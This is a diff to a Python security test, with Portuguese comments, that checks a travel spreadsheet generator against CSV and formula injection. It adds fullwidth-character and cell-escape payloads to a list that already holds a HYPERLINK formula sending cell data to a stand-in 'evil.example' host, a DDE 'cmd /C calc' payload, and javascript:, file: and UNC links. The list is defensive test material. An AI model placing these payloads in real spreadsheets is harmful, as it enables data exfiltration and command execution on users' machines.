@@ -14,7 +14,10 @@ S = os.path.join(RAIZ, "consultor-de-viagens", "scripts", "gerar_planilha.py")
 os.chdir(tempfile.mkdtemp(prefix="seg-viagens-"))
 P = ['=HYPERLINK("https://evil.example/?x="&A1,"clique")', "+cmd|' /C calc'!A0", "-2+3+EVIL()", "@SUM(1)+EVIL()",
      "\t=EVIL()", "\r=EVIL()", "\n=EVIL()", " =EVIL()", "＝EVIL()", "=IMPORTXML(\"https://evil.example\",\"//a\")",
-     "=WEBSERVICE(\"https://evil.example\")", "=IMAGE(\"https://evil.example/p.png\")"]
+     "=WEBSERVICE(\"https://evil.example\")", "=IMAGE(\"https://evil.example/p.png\")",
+     "＋EVIL()", "－EVIL()", "＠EVIL()",
+     # fuga da célula: separador e aspas tentando abrir uma célula nova que comece com "="
+     'ok";=EVIL();"', "ok;=EVIL()", 'ok","=EVIL()', "ok\n=EVIL()", "ok\r\n=EVIL()"]
 LINKS = ["javascript:alert(1)", "file:///C:/Windows/System32/calc.exe", "data:text/html,<script>alert(1)</script>",
          "  https://evil.example", "HTTPS://evil.example/ok", "\\\\evil.example\\share", "ms-excel:ofe|u|https://evil.example/x.xlsx"]
 def base(i):
@@ -72,7 +75,7 @@ for nome, d in casos.items():
     for f in glob.glob(f"out/{nome}*_csv/*.csv"):
         for linha in csv.reader(open(f, encoding="utf-8-sig"), delimiter=";"):
             for v in linha:
-                if v[:1] in ("=", "+", "-", "@", "\t", "\r", "\n", "＝") and MARCAS.search(v):
+                if v[:1] in ("=", "+", "-", "@", "\t", "\r", "\n", "＝", "＋", "－", "＠") and MARCAS.search(v):
                     achados.append((nome, "CSV INJETADO", f"{os.path.basename(f)}: {v[:60]!r}"))
                 if v.lower().startswith(("javascript:", "file:", "data:", "ms-excel:", "\\\\")):
                     achados.append((nome, "LINK PERIGOSO CSV", f"{os.path.basename(f)}: {v[:60]}"))
